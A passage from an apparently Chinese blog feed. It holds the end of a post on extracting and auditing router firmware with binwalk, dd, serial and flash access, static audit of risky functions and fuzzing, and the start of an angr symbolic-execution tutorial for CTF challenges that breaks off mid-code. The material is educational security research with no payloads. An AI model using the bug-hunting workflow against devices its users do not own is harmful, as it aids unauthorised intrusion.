XZ）中的一种进行打包写成<code>Squashfs</code>文件系统，再<strong>结合固件头部、压缩后的内核等部分形成完整固件</strong></p><p>系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，<strong>仅将对应部分的压缩文件解压缩</strong></p><h4 id="手工提取文件系统"><a href="#手工提取文件系统" class="headerlink" title="手工提取文件系统"></a>手工提取文件系统</h4><p>难点：</p><ol><li>不同的操作系统使用的文件系统不同</li><li>路由的文件系统的压缩算法有可能存在差异</li><li>有些路由甚至使用非标准的甚至是加密的压缩算法来打包文件系统</li></ol><p>常见解包手法：通过手工分析的方式从大量字节码数据中正确地识别出文件系统、固件解密、利用工具自动化分析</p><ul><li><p>信息收集：利用 file 查看文件类型，file 命令通过定义的 magic 签名文件来识别各种格式，在头部添加内容就会无法识别</p></li><li><p>进一步检索：</p><ul><li><p><code>strings xxx.bin | grep xxx</code>检索 magic 签名头，表明该文件可能包含某个文件系统</p><blockquote><p>cramfs特征：0x28cd3d45</p><p>squashfs特征：sqsh, hsqs, qshs, shsq, hsqt, tqsh, sqlz</p></blockquote><p>端序未知时需要进行两次搜索</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ strings firmware.bin <span class="token operator">|</span> <span class="token function">grep</span> <span class="token variable"><span class="token variable">`</span>python <span class="token parameter variable">-c</span> <span class="token string">'print "\x28\xcd\x3d\x45"'</span><span class="token variable">`</span></span>$ strings firmware.bin <span class="token operator">|</span> <span class="token function">grep</span> <span class="token variable"><span class="token variable">`</span>python <span class="token parameter variable">-c</span> <span class="token string">'print "\x45\x3d\xcd\x28"'</span><span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><code>hexdump -C xxx.bin | grep xx</code>确认某个签名之后检索 magic 签名偏移</p></li><li><p><code>dd | file -</code>确定签名具体偏移时可以用这个指令确认是否匹配某种文件格式</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//magic偏移0x100,复制从0x100开始的0x100字节到out,确认文件属性和大小$ <span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>firmware.bin <span class="token assign-left variable">bs</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">100</span> <span class="token assign-left variable">skip</span><span class="token operator">=</span><span class="token number">256</span> <span class="token assign-left variable">of</span><span class="token operator">=</span>out$ <span class="token function">file</span> out<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>dd 可从标准输入或文件中读取数据，根据指定的格式来转换数据，再输出到文件、设备或标准输出</p><p>if&#x3D;文件名：输入文件名，指定源文件</p><p>of&#x3D;文件名：输出文件名，指定目的文件</p><p>ibs&#x3D;bytes：一次读入bytes个字节<br>obs&#x3D;bytes：一次输出bytes个字节<br>bs&#x3D;bytes：同时设置读入&#x2F;输出的块大小为bytes个字节</p><p>cbs&#x3D;bytes：一次转换bytes个字节，即指定转换缓冲区大小</p><p>skip&#x3D;blocks：从输入文件开头跳过blocks个块后再开始复制</p><p>seek&#x3D;blocks：从输出文件开头跳过blocks个块后再开始复制</p><p>count&#x3D;blocks：仅拷贝blocks个块，大小等于ibs指定的字节数</p></blockquote></li><li><p>得到文件大小和偏移之后提取文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//从0x100开始提取1024字节到out$ <span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>firmware.bin <span class="token assign-left variable">bs</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">1024</span> <span class="token assign-left variable">skip</span><span class="token operator">=</span><span class="token number">256</span> <span class="token assign-left variable">of</span><span class="token operator">=</span>out.squashfs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>提取文件系统</p><p>提取出文件系统之后还需要<strong>还原文件系统中的根文件系统</strong>，利用 file -m 加载自定义的magic签名文件（这些文件通常包含用于匹配文件类型的模式和规则，包括文件头部的特定字节序列、文件大小、文件内容的特定模式等）以输出更详细的信息，了解压缩方式等，找对应工具解压</p></li></ul><h4 id="自动提取文件系统"><a href="#自动提取文件系统" class="headerlink" title="自动提取文件系统"></a>自动提取文件系统</h4><p>在线网站：<a href="https://zhiwanyuzhou.com/multiple_analyse/firmware/%E6%B2%A1%E6%9C%89%E5%88%86%E6%9E%90%E7%BB%93%E6%9E%9C%E8%AF%B4%E6%98%8E%E5%9B%BA%E4%BB%B6%E6%98%AF%E5%8A%A0%E5%AF%86%E7%9A%84">https://zhiwanyuzhou.com/multiple_analyse/firmware/没有分析结果说明固件是加密的</a></p><p>Binwalk：</p><ul><li><p>扫描固件中包含的所有可识别的文件类型</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ binwalk x.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>提取文件，解包出来的 squashfs-root 就是文件系统</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//-e 按照预定义的配置文件中的提取方法从固件中提取探测到的文件系统//-M 根据 magic 签名扫描结果进行递归提取$ binwalk <span class="token parameter variable">-Me</span> x.bin --run-as<span class="token operator">=</span>root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>分析可执行程序的指令系统，可以结合 file 和 checksec 确认</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ binwalk <span class="token parameter variable">-A</span> elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>其他用法：<code>--magic</code>指定自定义 magic 签名文件路径或将自定义的签名规则添加到<code>$HOME/.binwalk/magic/binwalk</code>来识别新文件类型，识别成功后可向 Binwalk 配置文件添加这种新文件类型</p></li></ul><h2 id="硬件层分析"><a href="#硬件层分析" class="headerlink" title="硬件层分析"></a>硬件层分析</h2><p>通过路由器硬件提供的接口获取固件，连接计算机和路由器主板，提取路由器数据</p><h3 id="路由器flash"><a href="#路由器flash" class="headerlink" title="路由器flash"></a>路由器flash</h3><p>闪存：路由器常用的一种内存类型，断电后仍能保存数据，存放正在使用的路由器操作系统等数据。</p><p>flash：像硬盘，有多个分区</p><ul><li><p>bootloader</p><p>常见的 bootloader 有 bios、uefi、u-boot 等，其中 u-boot 更多用于嵌入式系统</p><p>bootloader 存储对设备供电后<strong>启动操作系统的引导程序</strong>，<strong>对硬件环境初始化、更新固件、建立内存空间映射表</strong>从而配置适当的系统软硬件环境、调用操作系统内核并加载到内存中运行</p></li><li><p>kernel</p><p>操作系统内核</p></li><li><p>root filesystem</p><p>操作系统的根文件系统，如squashfs，rootfs</p></li><li><p>nvram</p><p>保存路由器配置文件，路由器启动后会从中读取配置文件对路由器进行设置</p></li></ul><h3 id="硬件提取数据思路"><a href="#硬件提取数据思路" class="headerlink" title="硬件提取数据思路"></a>硬件提取数据思路</h3><ul><li>连接主板上的 JTAG 之类调试接口</li><li>从主板上取下 Flash 芯片，通过芯片上的引脚连接编程器，但很容易对路由器造成物理损伤</li><li>利用芯片夹夹住芯片引脚，通过芯片夹接口连接到编程器，这样就不需要将芯片从主板上取下来</li></ul><h3 id="路由器串口"><a href="#路由器串口" class="headerlink" title="路由器串口"></a>路由器串口</h3><p>给开发人员使用，用于访问路由器固件环境、观察boot和调试信息、通过shell与系统进行交互异步串行通信、烧录固件等</p><p>路由器主要串口URAR，包含引脚：VCC（电源电压） GND（接地引脚） TXD（数据发送引脚） RXD（数据接收引脚）</p><h2 id="漏挖思路和方法"><a href="#漏挖思路和方法" class="headerlink" title="漏挖思路和方法"></a>漏挖思路和方法</h2><h3 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h3><p>对系统进行仿真，找开放了监听端口的服务，抓包分析，从通信网络层分析</p><ul><li><p>记录常见服务端口</p><p>http 80https 443DNS 53ftp 21ssh 22</p></li><li><p>从网络服务着手</p><p>抓包看本地回环&#x2F;整个局域网下的流量，能看见心跳包等数据报文，观察哪个程序起了主导的交互作用；看启动了什么进程，有哪些针对 <code>0.0.0.0</code> 的端口监听</p></li></ul><p>分析信息路由、路由导向，找分发网络消息的路由和处理逻辑，需要积累，例如 tenda 路由器的 web 启动程序通常在 bin 目录下的 httpd文件</p><p>确定漏挖目标进程，分析通信协议和与程序进行交互的方式，后续进行静态代码审计和模糊测试</p><h3 id="静态代码审计"><a href="#静态代码审计" class="headerlink" title="静态代码审计"></a>静态代码审计</h3><p>找核心逻辑的思路：</p><ol><li><p>多看源码，了解开发思路，熟悉相关框架</p></li><li><p>查找对 <code>socket, bind, listen, accept</code> 这类网络通信函数的调用，可以通过这些函数了解到当前<strong>程序的网络服务相关信息</strong></p><p>查找对 <code>sendmsg, recvmsg, read, write</code> 这类函数的调用，一般能够顺着这些交互点找到<strong>报文处理逻辑</strong></p></li><li><p>使用 python 脚本建立 socket 连接，查看回显，利用这些信息去搜索相应的字符串，查<strong>引用定位</strong>主要逻辑</p></li><li><p>查看程序的字符串，从一些输出报错、记录日志等相关字符串中窥探到函数功能</p><p>如输出信息 <code>option xxx</code> 一般是指命令的选项，类似 -r -a 那种参数，那这一部分代码就可能在执行某种选项功能</p></li></ol><p>分析敏感函数调用、数据处理，观察是否有溢出风险，以及数据处理不当导致的命令注入、逻辑漏洞等</p><p>从数据来源角度进行分析：</p><ul><li>命令行参数：对 argv 的处理</li><li>环境变量：getenv</li><li>文件、数据报文数据读取：read, fscanf, getc, fgetc, fgets, vfscanf</li><li>键盘输入、stdin：read, scanf, getchar, gets</li><li>网络数据：read, recv, recvfrom</li></ul><p>从数据操作角度进行分析：</p><ul><li>命令执行：system, popen, execve, execl, execvp</li><li>字符串拼接、复制：strcat, strcpy, strncpy</li><li>格式化字符串：sprintf, snprintf</li></ul><h3 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h3><p>Fuzzing 的大致流程：确定输入变量 -&gt;生成模糊测试数据 -&gt; 执行模糊测试 -&gt; 监视异常 -&gt; 根据被测试系统状态判断是否存在潜在安全漏洞</p><p>主流的 fuzz 工具有 AFL++、Boofuzz等，选择工具需要考虑 fuzz 工具的区别和使用</p><ol><li>fuzz 目标语言和平台：程序？内核？协议？…</li><li>变异策略 - 原语：了解工具的常用 API 使用方法，熟悉测试脚本编写</li><li>状态管理、性能和效率：fuzz 在某种程度上来说是比较低效的漏挖手段，这种情况下怎么判断 Crash 和有效值，减少误报</li><li>特殊情况：如分析目标在通信时会进行多次交互</li></ol><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>嘿嘿我ve1宝写的OvO</p><p><a href="https://xz.aliyun.com/t/16512">https://xz.aliyun.com/t/16512</a></p><p><a href="https://xz.aliyun.com/t/16511">https://xz.aliyun.com/t/16511</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前置基础&quot;&gt;&lt;a href=&quot;#前置基础&quot; class=&quot;headerlink&quot; title=&quot;前置基础&quot;&gt;&lt;/a&gt;前置基础&lt;/h2&gt;&lt;h3 id=&quot;路由的漏洞利用&quot;&gt;&lt;a href=&quot;#路由的漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;路由的</summary>
      
    
    
    
    <category term="IoT" scheme="https://starrysky1004.github.io/categories/IoT/"/>
    
    
    <category term="IoT" scheme="https://starrysky1004.github.io/tags/IoT/"/>
    
  </entry>
  
  <entry>
    <title>angr学习与angr_CTF题解（持续更新）</title>
    <link href="https://starrysky1004.github.io/2024/12/17/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/"/>
    <id>https://starrysky1004.github.io/2024/12/17/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/</id>
    <published>2024-12-16T16:18:27.000Z</published>
    <updated>2024-12-16T16:26:47.233Z</updated>
    
    <content type="html"><![CDATA[<h2 id="angr基础知识"><a href="#angr基础知识" class="headerlink" title="angr基础知识"></a>angr基础知识</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>angr 是一个支持多处理架构的用于二进制文件分析的工具包，它提供了动态符号执行的能力以及多种静态分析的能力。它可以被使用者扩展，用于自动化逆向工程、漏洞挖掘等多个方面</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ol><li>安装 angr</li></ol>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> pip <span class="token function">install</span> angr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>安装 angr-utils</li></ol>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$mkdir</span> angr-dev<span class="token variable">$cd</span> angr-dev<span class="token variable">$git</span> clone https://github.com/axt/bingraphvis<span class="token variable">$pip</span> <span class="token function">install</span> <span class="token parameter variable">-e</span> ./bingraphvis<span class="token variable">$git</span> clone https://github.com/axt/angr-utils<span class="token variable">$pip</span> <span class="token function">install</span> <span class="token parameter variable">-e</span> ./angr-utils<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><h4 id="project"><a href="#project" class="headerlink" title="project"></a>project</h4><p>project 类是 angr 的主类，也是angr的开始，通过初始化 project 类加载二进制文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrp <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'file_path'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其他可选参数</p><table><thead><tr><th>名称</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>auto_load_libs</td><td>是否自动加载程序的依赖（少加载无关结果的库可以提升angr效率）</td><td>auto_load_libs　&#x3D; False</td></tr><tr><td>skip_libs</td><td>希望避免加载的库</td><td>skip_libs &#x3D; 库名</td></tr><tr><td>except_missing_libs</td><td>无法解析库时是否抛出异常</td><td>True &#x2F; False</td></tr><tr><td>force_load_libs</td><td>强制加载的库</td><td>force_load_libs &#x3D; 库名</td></tr><tr><td>ld_path</td><td>共享库的优先搜索路径</td><td>ld_path &#x3D; 路径名</td></tr></tbody></table><p>project 类的方法和属性：</p><ul><li><p>p.arch : 文件架构</p></li><li><p>hex(p.entry) ： 程序入口点</p></li><li><p>p.filename ： 加载的文件名</p></li><li><p>p.arch.bits ： 字长（32位 &#x2F; 64位）</p></li><li><p>p.arch.memory_endness ： 大小端</p></li></ul><h4 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h4><p>project只是加载二进制文件，实际是对simstate对象操作</p><p>simstate对象是程序的状态，包含运行时的一切信息，例如寄存器、内存值、文件系统、<strong>符号变量</strong></p><p>创建状态</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>预设状态：</p><p>前两个比较常用，blank_state用于跳过一些极大降低angr效率的指令，初始时rax的数据类型都是bit vector</p><table><thead><tr><th>预设状态方式</th><th>描述</th></tr></thead><tbody><tr><td>entry_state</td><td>初始化状态为程序运行到程序入口点处的状态</td></tr><tr><td>blank_state(addr&#x3D;)</td><td><strong>大多数数据都没有初始化</strong>，状态中下一条指令为addr处的指令</td></tr><tr><td>full_init_state</td><td>共享库和预定义内容已经加载完毕，例如刚加载完共享库</td></tr><tr><td>call_state</td><td>准备调用函数的状态</td></tr></tbody></table><p>factory 类的方法：</p><ul><li>state.regs.rax</li></ul><h4 id="simgr"><a href="#simgr" class="headerlink" title="simgr"></a>simgr</h4><p>simulation manager（SM）模拟管理器，要分析程序就要让它到达下一个状态</p><p>使用 simgr 创建 sm， 需要传入 state 或 state的列表</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">simgr <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>state<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sm 有许多被成为 stash 的列表，保存了处于某种状态的 state</p><p>stash 是一个列表，可以用 python 方式遍历，angr 也提供了获取方式：stash 名字前加上 one_ 得到第一个状态，加上 mp_ 得到一个 mulpyplexed 版本的stash，例如<code>simgr.one_active</code></p><table><thead><tr><th>stash</th><th>描述</th></tr></thead><tbody><tr><td>active （默认值）</td><td>保存接下来可以执行并且将要执行的状态</td></tr><tr><td>deadended</td><td>由于某些原因不能继续执行的状态，例如没有合法指令，或者有非法指针</td></tr><tr><td>pruned</td><td>与 solve 的策略有关，当发现一个不可解的节点后，其后面所有的节点都优化掉放在 pruned 里</td></tr><tr><td>unconstrained</td><td>如果创建 SM 时启用了 save_unconstrained，则被认定为不受约束的 state 会放在这，不受约束的 state 是指由用户数据或符号控制的指令指针（例如eip）</td></tr><tr><td>unsat</td><td>如果创建SM时启用了save_unsat，则被认为不可满足的 state 会放在这里</td></tr></tbody></table><p>simgr 类的方法：</p><ul><li><p>使用 move() 转移state，将 fulter_func 筛选出来的 state 从 from_stash 转移到 to_stash</p><p><code>state.posix.dumps(0)</code>：到达当前状态对应的程序输入</p><p><code>state.posix.dumps(1)</code>：到达当前状态对应的程序输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#从 'deadended' 状态堆栈中，筛选出那些标准输出中包含字符串 '100' 的状态，并将这些状态移动到 'more_then_50' 状态堆栈中，匿名函数的参数是 s</span>simgr<span class="token punctuation">.</span>move<span class="token punctuation">(</span>from_stash<span class="token operator">=</span><span class="token string">'deadended'</span><span class="token punctuation">,</span> to_stash<span class="token operator">=</span><span class="token string">'more_then_50'</span><span class="token punctuation">,</span> filter_func<span class="token operator">=</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> <span class="token string">'100'</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>使用 step() 方法使处于 active 的 state 执行一个基本块，不会改变 state 本身</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">simgr<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="explorer"><a href="#explorer" class="headerlink" title="explorer"></a>explorer</h4><p>用于探索模拟状态直到找到特定条件满足的状态的方法，有 <strong>find</strong>（目标指令的地址或地址列表） 和 <strong>avoid</strong>（避免的指令地址或地址列表） 两种参数，找到符合的 find 状态会保存在 <strong>simger.found</strong> 列表中，可遍历元素获取状态</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'path_to_binary'</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span>find_address <span class="token operator">=</span> <span class="token number">0x4017c0</span>avoid_address <span class="token operator">=</span> <span class="token number">0x401230</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>find_address<span class="token punctuation">,</span> avoid<span class="token operator">=</span>avoid_address<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>   <span class="token comment">#打印出符号条件的状态的输入    </span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><ul><li><code>solver.eval(expression)</code> 将会解出一个可行解</li><li><code>solver.eval_one(expression)</code>将会给出一个表达式的可行解，若有多个可行解，则抛出异常。</li><li><code>solver.eval_upto(expression, n)</code>将会给出最多n个可行解，如果不足n个就给出所有的可行解。</li><li><code>solver.eval_exact(expression, n)</code>将会给出n个可行解，如果解的个数不等于n个，将会抛出异常。</li><li><code>solver.min(expression)</code>将会给出最小可行解</li><li><code>solver.max(expression)</code>将会给出最大可行解</li></ul><h4 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h4><p>符号执行就是<u>给程序传递一个符号而不是具体的值</u></p><p>遇到分支时 angr 会保存所有分支以及分支后的所有分支，在分支时保存进入该分支时的判断条件，通常判断条件是对符号的约束</p><p>当 angr 运行到目标状态可以调用求解器对一路上收集到的约束求解，最终得到某个符号能够到达当前状态的值</p><p><img src="/angr%E5%AD%A6%E4%B9%A0%E4%B8%8Eangr-CTF%E9%A2%98%E8%A7%A3%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/3031561-20221129171743462-301356444.png" alt="img"></p><p><img src="/angr%E5%AD%A6%E4%B9%A0%E4%B8%8Eangr-CTF%E9%A2%98%E8%A7%A3%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/3031561-20221128133848616-99279409.png" alt="img"></p><p>angr 的 state 属性都是状态插件，包括 memory 、regs 、 men 、registers 、solver等，用于控制仿真程序看到的环境，包括如何从环境中引入符号数据</p><h5 id="寄存器符号化"><a href="#寄存器符号化" class="headerlink" title="寄存器符号化"></a>寄存器符号化</h5><p>跳过输入定位到输入之后，直接改变寄存器，将 state 传入 simgr，<code>solution_state.solver.eval(arg1)</code>获取得到的值，可控制多个寄存器</p><p>位向量：BVV(value, size)BVS(name, size)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'file_path'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start<span class="token punctuation">)</span><span class="token comment">#创建位向量</span>passwd <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'passwd'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> passwdsimgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="栈中的值符号化"><a href="#栈中的值符号化" class="headerlink" title="栈中的值符号化"></a>栈中的值符号化</h5><p>通过计算构造，例如 arg1 -&gt; <u>ebp - 0xc</u>; arg2 -&gt; <u>ebp - 0x10</u></p><p>则构造esp &#x3D; ebp， esp - 0x8， 两个参数入栈（stack_push）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">initial_state_regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esparg1 <span class="token operator">=</span> charipy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> charipy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">-=</span> <span class="token number">8</span>initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="内存符号化"><a href="#内存符号化" class="headerlink" title="内存符号化"></a>内存符号化</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>passwd0_address<span class="token punctuation">,</span> passwd0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以字节类型输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="动态内存符号化"><a href="#动态内存符号化" class="headerlink" title="动态内存符号化"></a>动态内存符号化</h5><p>由于 angr 并没有真正 运行 二进制文件而只是在模拟运行状态，因此它实际上不需要将内存分配到堆中，实际上可以伪造任何地址，所以将伪造的地址存放到 bss 段的地址中模拟题目的情况即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address0<span class="token punctuation">,</span> fake_heap_address0<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>endness 设置端序，可以直接 project.arch.memory_endness 获取程序端序</p><pre class="line-numbers language-none"><code class="language-none">LE – 小端序(little endian, least significant byte is stored at lowest address)BE – 大端序(big endian, most significant byte is stored at lowest address)ME – 中间序(Middle-endian. Yep.)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="文件内容符号化"><a href="#文件内容符号化" class="headerlink" title="文件内容符号化"></a>文件内容符号化</h5><p>仿真文件系统并插入文件，blank_state 从打开文件部分地址开始</p><p>symbolic_file_size_bytes 是文件中的内容长度，passwd_file 是实际读出的长度</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#形成符号化的文件格式</span>passwd_file <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token operator">=</span>passwd0<span class="token punctuation">,</span> size<span class="token operator">=</span>symbolic_file_size_bytes<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> passwd_file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="添加约束条件"><a href="#添加约束条件" class="headerlink" title="添加约束条件"></a>添加约束条件</h4><p>在实际的测试生产中符号执行技术存在约束求解问题和路径爆炸问题，当程序存在循环结构的时候即使是简单逻辑也可能产生规模巨大的执行路径导致路径爆炸，所以需要提供更多的约束控制路径爆炸问题</p><h5 id="约束求解"><a href="#约束求解" class="headerlink" title="约束求解"></a>约束求解</h5><p>用字符串直接比较约束取代循环判断函数， angr 提供加入约束条件的方法 <code>state.solver.add</code> ，将每个符号化的布尔值作为一个关于符号变量合法性的断言</p><p>示例</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x <span class="token operator">-</span> y <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>y <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token number">5</span><span class="token operator">>></span><span class="token operator">></span> state<span class="token 